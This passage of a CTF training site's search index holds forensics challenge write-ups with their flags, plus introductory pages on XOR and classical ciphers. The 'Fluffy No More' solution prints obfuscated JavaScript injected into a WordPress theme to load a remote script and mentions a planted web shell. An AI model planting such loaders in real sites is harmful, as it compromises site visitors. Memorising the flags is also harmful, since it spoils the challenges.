secret.txt\n\n\n0\n directories, \n1\n file\n+bash-4.3$ file out/secret.txt \nout/secret.txt: ASCII text\n+bash-4.3$ \ncd\n out/\n+bash-4.3$ cat secret.txt \n|\n tr -d \n\\n\n \n|\n base64 --decode pic.jpg\n+bash-4.3$ file pic.jpg \npic.jpg: JPEG image data\n\n\n\n\n\nUsing any hexeditor or \nstrings\n, we find that the JPG contains two base64 encoded blobs:\n\n\n$ strings -a pic.jpg \nb#o\n]\n\nY2EB\n V~D\n\n[\n...\n]\n\n\naKxw\n\n\nS#UH\n\n\nVVGEC8uGDQuNhhk6FKg0ICF9jVAUS54zurveSzXcwE9MsIHIZPuvP6vrSDgwULy5Kvm/wPe3zxddM4SSPgvWIg==\n\n\nXQN6Y6QIpfofWw857i5DK[...]\n\n$\n strings -a pic.jpg | tail -n2 strings.b64\n\n\n\n\n\n\nHowever, both blobs do not seem to be anything obvious at first:\n\n\n$ sed \n1q;d\n strings.b64 \n|\n b64d \n|\n xxd\n\n0000000\n: \n5551\n 840b cb86 0d0b 8d86 193a 14a8 \n3420\n  UQ.........:..4 \n\n0000010\n: 217d 8d50 144b 9e33 babb de4b 35dc c04f  !\n}\n.P.K.3...K5..O\n\n0000020\n: 4cb0 81c8 64fb af3f abeb \n4838\n \n3050\n bcb9  L...d..?..H80P..\n\n0000030\n: 2af9 bfc0 f7b7 cf17 5d33 \n8492\n 3e0b d622  *.......\n]\n3\n..\n..\n\n$\n sed \n2q;d\n strings.b64 | b64d | xxd\n\n\n0000000: 5d03 7a63 a408 a5fa 1f5b 0f39 ee2e 432b  ].zc.....[.9..C+\n\n\n0000010: bd55 57e0 0cc3 7aa4 9797 c906 abc4 4e82  .UW...z.......N.\n\n\n[...]\n\n\n0003450: c273 cfa0 b5ca 8535 64b4 40a6 501e f7de  .s.....5d.@.P...\n\n\n0003460: b749 d99b 18ea 3dd7 af98 e685 295f 312e  .I....=.....)_1.\n\n\n0003470: 7a35 2b36 ca13 86a0 9265 6802 f0f8 4e3d  z5+6.....eh...N=\n\n\n\n\n\n\nAs \nthis writeup\n suggests, we have to use a program called \nFree File Camouflage\n to extract a hdden file from the blob(s) - an ELF.\nThe final step is to run the ELF to receive the flag \nflag{s3v3r4l_l4y3r5_d33p_\n_2m4ny_l4yers_w1d3}\n.\n\n\nSetup\n\n\nMandiant_c920fc463eaf996489749457abc9b2eb.pdf", 
            "title": "Mandient"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#mandiant", 
            "text": "", 
            "title": "Mandiant"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#author", 
            "text": "D'Antoine", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#description", 
            "text": "We found this file. Help Mandiant figure out what APT1 is trying to send.\nHint: check out free_file_camouflage", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#flag", 
            "text": "flag{s3v3r4l_l4y3r5_d33p_ _2m4ny_l4yers_w1d3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#solution", 
            "text": "by  polym \nThis writeup is based on a writeup by  krx .\nWe are given a PDF that contains an EmbeddedFile object stream, see  7.11.4 of the official PDF specification by Adobe .\nUsing  qpdf  and a common text editor, we can extract the embedded file (base64 encoded) in a simple manner:  $ qpdf --qdf --object-streams = disable Mandiant_c920fc463eaf996489749457abc9b2eb.pdf out.pdf  \nWe decode it using  base64 --decode  to find a PNG:  $ cat out.b64  |  tr -d  \\n   |  b64d pic.png \n$ file pic.png\npic.png: PNG image data,  610  x  467 ,  8 -bit/color RGBA, non-interlaced  The PNG contains a 7-zip archive, which we extract using  scalpel  using a modified version of  this config :  $ binwalk pic.png  |  grep -v Zlib\nDECIMAL       HEXADECIMAL     DESCRIPTION\n-------------------------------------------------------------------------------- 0              0x0             PNG image,  610  x  467 ,  8 -bit/color RGBA, non-interlaced 160173         0x271AD          7 -zip archive data, version  0 .4\n$ scalpel -vc scalpel.conf pic.png\n$ tree scalpel-output/\nscalpel-output/\n\u251c\u2500\u2500 7z-10-0\n\u2502\u00a0\u00a0 \u2514\u2500\u2500  00000000 .7z\n\u2514\u2500\u2500 audit.txt 1  directory,  2  files  Inside the 7z there is a JPG (also base64 encoded), which we extract using  7z :  +bash-4.3$  cd  7z-10-0/\n+bash-4.3$ ls 00000000 .7z\n+bash-4.3$ 7z x  00000000 .7z -oout 7 -Zip  [ 64 ]   9 .20  Copyright  ( c )   1999 -2010 Igor Pavlov   2010 -11-18\np7zip Version  9 .20  ( locale = utf8,Utf16 = on,HugeFiles = on,8 CPUs ) \n\nProcessing archive:  00000000 .7z\n\nExtracting  secret.txt\n\nEverything is Ok\n\nSize:        58375 \nCompressed:  43850 \n+bash-4.3$ tree out/\nout/\n\u2514\u2500\u2500 secret.txt 0  directories,  1  file\n+bash-4.3$ file out/secret.txt \nout/secret.txt: ASCII text\n+bash-4.3$  cd  out/\n+bash-4.3$ cat secret.txt  |  tr -d  \\n   |  base64 --decode pic.jpg\n+bash-4.3$ file pic.jpg \npic.jpg: JPEG image data  Using any hexeditor or  strings , we find that the JPG contains two base64 encoded blobs:  $ strings -a pic.jpg \nb#o ] \nY2EB\n V~D [ ... ]  aKxw  S#UH  VVGEC8uGDQuNhhk6FKg0ICF9jVAUS54zurveSzXcwE9MsIHIZPuvP6vrSDgwULy5Kvm/wPe3zxddM4SSPgvWIg==  XQN6Y6QIpfofWw857i5DK[...] \n$  strings -a pic.jpg | tail -n2 strings.b64   However, both blobs do not seem to be anything obvious at first:  $ sed  1q;d  strings.b64  |  b64d  |  xxd 0000000 :  5551  840b cb86 0d0b 8d86 193a 14a8  3420   UQ.........:..4  0000010 : 217d 8d50 144b 9e33 babb de4b 35dc c04f  ! } .P.K.3...K5..O 0000020 : 4cb0 81c8 64fb af3f abeb  4838   3050  bcb9  L...d..?..H80P.. 0000030 : 2af9 bfc0 f7b7 cf17 5d33  8492  3e0b d622  *....... ] 3 .. .. \n$  sed  2q;d  strings.b64 | b64d | xxd  0000000: 5d03 7a63 a408 a5fa 1f5b 0f39 ee2e 432b  ].zc.....[.9..C+  0000010: bd55 57e0 0cc3 7aa4 9797 c906 abc4 4e82  .UW...z.......N.  [...]  0003450: c273 cfa0 b5ca 8535 64b4 40a6 501e f7de  .s.....5d.@.P...  0003460: b749 d99b 18ea 3dd7 af98 e685 295f 312e  .I....=.....)_1.  0003470: 7a35 2b36 ca13 86a0 9265 6802 f0f8 4e3d  z5+6.....eh...N=   As  this writeup  suggests, we have to use a program called  Free File Camouflage  to extract a hdden file from the blob(s) - an ELF.\nThe final step is to run the ELF to receive the flag  flag{s3v3r4l_l4y3r5_d33p_ _2m4ny_l4yers_w1d3} .", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/mandiant/#setup", 
            "text": "Mandiant_c920fc463eaf996489749457abc9b2eb.pdf", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/", 
            "text": "ransomewhere\n\n\nAuthor\n\n\nSmith\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nWe got hit by some randsomware and we lost our most important file. Please help use recover it.\n- TwoSigma (Jay Smith)\n\n\nFlag\n\n\nyo mama so fat, she can\nt store files larger than 4 GB\n\n\nSolution\n\n\nhttps://github.com/kareemroks101/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20randsomewhere\n\n\nSetup\n\n\nrandsomewhere_0bcb28bec3683610d7048879a1374335.img.zip", 
            "title": "Ransomwhere"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#ransomewhere", 
            "text": "", 
            "title": "ransomewhere"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#author", 
            "text": "Smith", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#description", 
            "text": "We got hit by some randsomware and we lost our most important file. Please help use recover it.\n- TwoSigma (Jay Smith)", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#flag", 
            "text": "yo mama so fat, she can t store files larger than 4 GB", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#solution", 
            "text": "https://github.com/kareemroks101/CTF-Writeups/tree/master/CSAW%2015%20Finals/for300%20-%20randsomewhere", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/ransomewhere/#setup", 
            "text": "randsomewhere_0bcb28bec3683610d7048879a1374335.img.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/", 
            "text": "Sharpturn\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nI think my SATA controller is dying.\nHINT: \ngit fsck -v\n\n\nFlag\n\n\nflag{3b532e0a187006879d262141e16fa5f05f2e6752}\n\n\nSolution\n\n\nSetup", 
            "title": "Sharpturn"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#sharpturn", 
            "text": "", 
            "title": "Sharpturn"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#author", 
            "text": "Stortz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#description", 
            "text": "I think my SATA controller is dying.\nHINT:  git fsck -v", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#flag", 
            "text": "flag{3b532e0a187006879d262141e16fa5f05f2e6752}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/forensics/sharpturn/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/", 
            "text": "Aristotle\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\nHere's a PCAP, the flag you need to submit is in the form flag{wordonewordtwowordthree} where wordone, wordtwo, and wordthree are taken from the word game in the following pcap.\n\n\nFlag\n\n\nflag{observedoubledivide}\n\n\nSolution\n\n\nSetup\n\n\nNotes\n\n\nIf they need a hint, point them at: \nhttp://www.cyber1.org/pterm.asp\n\n(shouldn't be necessary since the dns resolution at the beginning gives a domain anme that is google-able as associatd with cyber1.org)\nForensics/Reverse Engineering challenge (not really RE since the source is given, but converting from the source and pcap to meaningful data requires some work. No idea on the difficulty here, should be playtested, or the scoreboard should adjust based on how many people solve or something.", 
            "title": "Aristotle"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#aristotle", 
            "text": "", 
            "title": "Aristotle"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#description", 
            "text": "Here's a PCAP, the flag you need to submit is in the form flag{wordonewordtwowordthree} where wordone, wordtwo, and wordthree are taken from the word game in the following pcap.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#flag", 
            "text": "flag{observedoubledivide}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/forensics/aristotle_-_Wiens/#notes", 
            "text": "If they need a hint, point them at:  http://www.cyber1.org/pterm.asp \n(shouldn't be necessary since the dns resolution at the beginning gives a domain anme that is google-able as associatd with cyber1.org)\nForensics/Reverse Engineering challenge (not really RE since the source is given, but converting from the source and pcap to meaningful data requires some work. No idea on the difficulty here, should be playtested, or the scoreboard should adjust based on how many people solve or something.", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/", 
            "text": "Fluffy No More\n\n\nAuthor\n\n\nAntoniweicz\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nForensics\n\n\nDescription\n\n\n\"OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious \"\"Forgotten Freaks\"\" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??\nWell... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!\"\n\n\nFlag\n\n\nkey{Those Fluffy Bunnies Make Tummy Bumpy}\n\n\nSolution\n\n\nWithin the apache log file (/var/logs/apache2/access.log) is an indicator of attack for the MailPoet vulnerability. Details here: \nhttp://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html\n\nI dont expect people to find that really, but maybe they will. The vulnerability is exploited and uploads two files to\n\n\n/var/www/html/wp-content/uploads/wysija/themes/weblizer\n\n\n\n\n\ntemplate.php is a weevely shell. There is also a single execution command entry in the access.log of the attacker's modifications to the wordpress install, but people might not notice that either.\nThe attacker modified \n/var/www/html/wp-content/themes/twentythirteen/js/html5.js\n which only gets rendered if a user is using IE9 or below.\n\n\n!--[if lt IE 9]\n\n\n    \nscript src=\nhttp://blog.eyeheartfluffybunnies.com/wp-content/themes/twentythirteen/js/html5.js\n/script\n\n\n    \n![endif]--\n\n\n\n\n\n\nThis is not attacker added code, but naturally occuring. You can see this from the source on the webpage. My expectation is people will actually create a LAMP server to replicate and notice this condition or do a diff of the plugins/themes.\nHowever they get there, they'll hopefully notice that html5.js has a modification:\n\n\nvar g=\nti\n;var c=\nHTML Tags\n;var f=\n. li colgroup br src datalist script option .\n;f = f.split(\n \n);c=\n;k=\n/\n;m=f[6];for(var i=0;i\nf.length\n;i++){c+=f[i].length.toString();}\nv=\nf[0];x=\n\\\nht\n;b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f=\n;c=c.split(\n);var\n \nw=\n0;u=\ns\n;for(var\n \ni=\n0;i\nc.length;i++){if(((i==3||i==6)\nw!=2)||((i==8)\nw==2)){f+=String.fromCharCode(46);w++;}f+=c[i];}\n \ni=\nk+\nanal\n;\n \ndocument.write(\n+m+\n \n+b+\n=\n+x+\ntp:\n+k+k+f+i+\ny\n+g+\nc\n+u+v+\nj\n+u+\n\\\n\\\n/\n+m+\n\\\n);\n\n\n\n\n\nThis is an obfuscated way to do a script include from \nhttp://128.238.66.100/analytics.js\n\nStudents could notice this, or maybe use developer mode in the browser to see the js include.\nOnce to \nanalytics.js\n, there is more obfuscation its basically two giagantic blocks of dummy code around:\n\n\nvar _0x91fe=[\n\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x31\\x32\\x38\\x2E\\x32\\x33\\x38\\x2E\\x36\\x36\\x2E\\x31\\x30\\x30\\x2F\\x61\\x6E\\x6E\\x6F\\x75\\x6E\\x63\\x65\\x6D\\x65\\x6E\\x74\\x2E\\x70\\x64\\x66\n,\n\\x5F\\x73\\x65\\x6C\\x66\n,\n\\x6F\\x70\\x65\\x6E\n];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);\n\n\n\n\n\nThis opens a new window that renders \nhttp://128.238.66.100/announcement.pdf\n\nI expect that students will either use a user-agent switcher or \nIE9 to get the request for announcement.pdf. I dont know that anyone will deal with the javascript.\nThen the announcement.pdf has a file stream in it, you can\n\n\npdfextract announcement.pdf\ncd announcement.dump/streams\ncat steam_8\n\n\n\n\n\nto see another javascript obfuscated version of:\n\n\nvar key = \nYOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}\n;\n\n\n\n\n\nSetup", 
            "title": "Fluffy No More"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#fluffy-no-more", 
            "text": "", 
            "title": "Fluffy No More"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#author", 
            "text": "Antoniweicz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#category", 
            "text": "Forensics", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#description", 
            "text": "\"OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious \"\"Forgotten Freaks\"\" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??\nWell... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!\"", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#flag", 
            "text": "key{Those Fluffy Bunnies Make Tummy Bumpy}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#solution", 
            "text": "Within the apache log file (/var/logs/apache2/access.log) is an indicator of attack for the MailPoet vulnerability. Details here:  http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html \nI dont expect people to find that really, but maybe they will. The vulnerability is exploited and uploads two files to  /var/www/html/wp-content/uploads/wysija/themes/weblizer  template.php is a weevely shell. There is also a single execution command entry in the access.log of the attacker's modifications to the wordpress install, but people might not notice that either.\nThe attacker modified  /var/www/html/wp-content/themes/twentythirteen/js/html5.js  which only gets rendered if a user is using IE9 or below.  !--[if lt IE 9]       script src= http://blog.eyeheartfluffybunnies.com/wp-content/themes/twentythirteen/js/html5.js /script       ![endif]--   This is not attacker added code, but naturally occuring. You can see this from the source on the webpage. My expectation is people will actually create a LAMP server to replicate and notice this condition or do a diff of the plugins/themes.\nHowever they get there, they'll hopefully notice that html5.js has a modification:  var g= ti ;var c= HTML Tags ;var f= . li colgroup br src datalist script option . ;f = f.split(   );c= ;k= / ;m=f[6];for(var i=0;i f.length ;i++){c+=f[i].length.toString();} v= f[0];x= \\ ht ;b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f= ;c=c.split( );var   w= 0;u= s ;for(var   i= 0;i c.length;i++){if(((i==3||i==6) w!=2)||((i==8) w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];}   i= k+ anal ;   document.write( +m+   +b+ = +x+ tp: +k+k+f+i+ y +g+ c +u+v+ j +u+ \\ \\ / +m+ \\ );  This is an obfuscated way to do a script include from  http://128.238.66.100/analytics.js \nStudents could notice this, or maybe use developer mode in the browser to see the js include.\nOnce to  analytics.js , there is more obfuscation its basically two giagantic blocks of dummy code around:  var _0x91fe=[ \\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x31\\x32\\x38\\x2E\\x32\\x33\\x38\\x2E\\x36\\x36\\x2E\\x31\\x30\\x30\\x2F\\x61\\x6E\\x6E\\x6F\\x75\\x6E\\x63\\x65\\x6D\\x65\\x6E\\x74\\x2E\\x70\\x64\\x66 , \\x5F\\x73\\x65\\x6C\\x66 , \\x6F\\x70\\x65\\x6E ];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);  This opens a new window that renders  http://128.238.66.100/announcement.pdf \nI expect that students will either use a user-agent switcher or  IE9 to get the request for announcement.pdf. I dont know that anyone will deal with the javascript.\nThen the announcement.pdf has a file stream in it, you can  pdfextract announcement.pdf\ncd announcement.dump/streams\ncat steam_8  to see another javascript obfuscated version of:  var key =  YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy} ;", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/forensics/Fluffy_No_More/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/cryptography/introduction/", 
            "text": "Cryptography\n\n\nCryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code.\n\n\nThe word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis.\n\n\nWhat is cryptography used for?\n\n\nLegitimate uses\n\n- Securing web traffic (passwords, communication, etc.)\n- Securing copyrighted software code\n\n\nMalicious uses\n\n- Hiding malicious communication\n- Hiding malicious code\n\n\nTopics\n\n\n\n\nXOR\n\n\nCesear Cipher\n\n\nSubstitution Cipher\n\n\nVigenere Cipher\n\n\nHashing Functions\n\n\nBlock Modes of Operation\n\n\nRSA", 
            "title": "Introduction"
        }, 
        {
            "location": "/cryptography/introduction/#cryptography", 
            "text": "Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code.  The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis.", 
            "title": "Cryptography"
        }, 
        {
            "location": "/cryptography/introduction/#what-is-cryptography-used-for", 
            "text": "Legitimate uses \n- Securing web traffic (passwords, communication, etc.)\n- Securing copyrighted software code  Malicious uses \n- Hiding malicious communication\n- Hiding malicious code", 
            "title": "What is cryptography used for?"
        }, 
        {
            "location": "/cryptography/introduction/#topics", 
            "text": "XOR  Cesear Cipher  Substitution Cipher  Vigenere Cipher  Hashing Functions  Block Modes of Operation  RSA", 
            "title": "Topics"
        }, 
        {
            "location": "/cryptography/what-is-xor/", 
            "text": "XOR\n\n\nData Representation\n\n\nData can be represented in different bases, an 'A' needs to be a numerical representation of Base 2 or binary so computers can understand them\n\n\n\n\nXOR Basics\n\n\nAn XOR or \neXclusive OR\n is a bitwise operation indicated by \n^\n and shown by the following truth table:\n\n\n\n\n\n\n\n\nA\n\n\nB\n\n\nA ^ B\n\n\n\n\n\n\n\n\n\n\n0\n\n\n0\n\n\n0\n\n\n\n\n\n\n0\n\n\n1\n\n\n1\n\n\n\n\n\n\n1\n\n\n0\n\n\n1\n\n\n\n\n\n\n1\n\n\n1\n\n\n0\n\n\n\n\n\n\n\n\nSo what XOR'ing bytes in the action \n0xA0 ^ 0x2C\n translates to is:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n1\n\n\n0\n\n\n1\n\n\n0\n\n\n0\n\n\n0\n\n\n0\n\n\n0\n\n\n\n\n\n\n0\n\n\n0\n\n\n1\n\n\n0\n\n\n1\n\n\n1\n\n\n0\n\n\n0\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n1\n\n\n0\n\n\n0\n\n\n0\n\n\n1\n\n\n1\n\n\n0\n\n\n0\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n0b10001100\n is equivelent to \n0x8C\n, a cool property of XOR is that it is reversable meaning \n0x8C ^ 0x2C = 0xA0\n and \n0x8C ^ 0xA0 = 0x2C\n\n\n\n\nWhat does this have to do with CTF?\n\n\nXOR is a cheap way to encrypt data with a password. Any data can be encrypted using XOR as shown in this Python example:\n\n\n data = \nCAPTURETHEFLAG\n\n\n key = \nA\n\n\n encrypted = \n.join([chr(ord(x) ^ ord(key)) for x in data])\n\n encrypted\n\n\\x02\\x00\\x11\\x15\\x14\\x13\\x04\\x15\\t\\x04\\x07\\r\\x00\\x06\n\n\n decrypted = \n.join([chr(ord(x) ^ ord(key)) for x in encrypted])\n\n decrypted\n\nCAPTURETHEFLAG\n\n\n\n\n\n\nThis can be extended using a multibyte key by iterating in parallel with the data.\n\n\nExploiting XOR Encryption\n\n\nSingle Byte XOR Encryption\n\n\nSingle Byte XOR Encryption is trivial to bruteforce as there are only 255 key combinations to try.\n\n\nMultibyte XOR Encryption\n\n\nMultibyte XOR gets exponentially harder the longer the key, but if the encrypted text is long enough, character frequency analysis is a viable method to find the key. Character Frequency Analysis means that we split the cipher text into groups based on the number of characters in the key. These groups then are bruteforced using the idea that some letters appear more frequently in the english alphabet than others.", 
            "title": "What is XOR"
        }, 
        {
            "location": "/cryptography/what-is-xor/#xor", 
            "text": "", 
            "title": "XOR"
        }, 
        {
            "location": "/cryptography/what-is-xor/#data-representation", 
            "text": "Data can be represented in different bases, an 'A' needs to be a numerical representation of Base 2 or binary so computers can understand them", 
            "title": "Data Representation"
        }, 
        {
            "location": "/cryptography/what-is-xor/#xor-basics", 
            "text": "An XOR or  eXclusive OR  is a bitwise operation indicated by  ^  and shown by the following truth table:     A  B  A ^ B      0  0  0    0  1  1    1  0  1    1  1  0     So what XOR'ing bytes in the action  0xA0 ^ 0x2C  translates to is:                 1  0  1  0  0  0  0  0    0  0  1  0  1  1  0  0        1  0  0  0  1  1  0  0                 0b10001100  is equivelent to  0x8C , a cool property of XOR is that it is reversable meaning  0x8C ^ 0x2C = 0xA0  and  0x8C ^ 0xA0 = 0x2C", 
            "title": "XOR Basics"
        }, 
        {
            "location": "/cryptography/what-is-xor/#what-does-this-have-to-do-with-ctf", 
            "text": "XOR is a cheap way to encrypt data with a password. Any data can be encrypted using XOR as shown in this Python example:   data =  CAPTURETHEFLAG   key =  A   encrypted =  .join([chr(ord(x) ^ ord(key)) for x in data])  encrypted \\x02\\x00\\x11\\x15\\x14\\x13\\x04\\x15\\t\\x04\\x07\\r\\x00\\x06   decrypted =  .join([chr(ord(x) ^ ord(key)) for x in encrypted])  decrypted CAPTURETHEFLAG   This can be extended using a multibyte key by iterating in parallel with the data.", 
            "title": "What does this have to do with CTF?"
        }, 
        {
            "location": "/cryptography/what-is-xor/#exploiting-xor-encryption", 
            "text": "", 
            "title": "Exploiting XOR Encryption"
        }, 
        {
            "location": "/cryptography/what-is-xor/#single-byte-xor-encryption", 
            "text": "Single Byte XOR Encryption is trivial to bruteforce as there are only 255 key combinations to try.", 
            "title": "Single Byte XOR Encryption"
        }, 
        {
            "location": "/cryptography/what-is-xor/#multibyte-xor-encryption", 
            "text": "Multibyte XOR gets exponentially harder the longer the key, but if the encrypted text is long enough, character frequency analysis is a viable method to find the key. Character Frequency Analysis means that we split the cipher text into groups based on the number of characters in the key. These groups then are bruteforced using the idea that some letters appear more frequently in the english alphabet than others.", 
            "title": "Multibyte XOR Encryption"
        }, 
        {
            "location": "/cryptography/what-is-a-substitution-cipher/", 
            "text": "Substitution Cipher\n\n\nA Substitution Cipher is system of encryption where different symobls substitute a normal alphabet.", 
            "title": "What is a Substitution Cipher"
        }, 
        {
            "location": "/cryptography/what-is-a-substitution-cipher/#substitution-cipher", 
            "text": "A Substitution Cipher is system of encryption where different symobls substitute a normal alphabet.", 
            "title": "Substitution Cipher"
        }, 
        {
            "location": "/cryptography/what-is-caesar-cipher-rot-13/", 
            "text": "Caesar Cipher/ROT 13\n\n\nThe Caesar Cipher or Caesar Shift is a cipher which uses the alphabet in order to encode texts.\n\n\nCAESAR\n encoded with a shift of 8 is \nKIMAIZ\n so \nABCDEFGHIJKLMNOPQRSTUVWXYZ\n becomes \nIJKLMNOPQRSTUVWXYZABCDEFGH\n\n\nROT13 is the same thing but a fixed shift of 13, this is a trivial cipher to bruteforce because there are only 25 shifts.", 
            "title": "Caesar Cipher/ROT 13"
        }, 
        {
            "location": "/cryptography/what-is-caesar-cipher-rot-13/#caesar-cipherrot-13", 
            "text": "The Caesar Cipher or Caesar Shift is a cipher which uses the alphabet in order to encode texts.  CAESAR  encoded with a shift of 8 is  KIMAIZ  so  ABCDEFGHIJKLMNOPQRSTUVWXYZ  becomes  IJKLMNOPQRSTUVWXYZABCDEFGH  ROT13 is the same thing but a fixed shift of 13, this is a trivial cipher to bruteforce because there are only 25 shifts.", 
            "title": "Caesar Cipher/ROT 13"
        }, 
        {
            "location": "/cryptography/what-is-a-vigenere-cipher/", 
